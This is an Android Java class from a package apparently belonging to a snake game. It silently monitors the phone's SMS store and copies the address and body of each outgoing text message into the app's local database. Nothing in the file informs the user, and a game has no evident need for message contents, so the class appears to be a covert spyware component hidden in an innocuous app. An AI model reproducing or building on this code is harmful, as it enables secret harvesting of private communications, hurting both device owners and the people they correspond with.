package com.example.s1300465.snake;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class OutgoingSMSObserver extends ContentObserver {
    Context context;
    ContentResolver contentResolver;

    public OutgoingSMSObserver(Handler handler, Context context, ContentResolver contentResolver) {
        super(handler);
        this.context = context;
        this.contentResolver = contentResolver;
    }

    @Override
    public void onChange(boolean selfChange){
        super.onChange(selfChange);

        Uri uriSMS = Uri.parse("content://sms/");
        Cursor cur = contentResolver.query(uriSMS, null, null, null, null);
        try {
            cur.moveToNext();
        }catch(NullPointerException ex){
            return;
        }


        int type = cur.getInt(cur.getColumnIndex("type"));
        if(type == 2){ //if type is outgoing
            //Extract what we want, and save
            String message = cur.getString(cur.getColumnIndex("body"));
            String address = cur.getString(cur.getColumnIndex("address"));

            DatabaseHelper dbh = new DatabaseHelper(context);
            dbh.saveSMS(address, true, message, System.currentTimeMillis());
        }

        cur.close();
    }
}
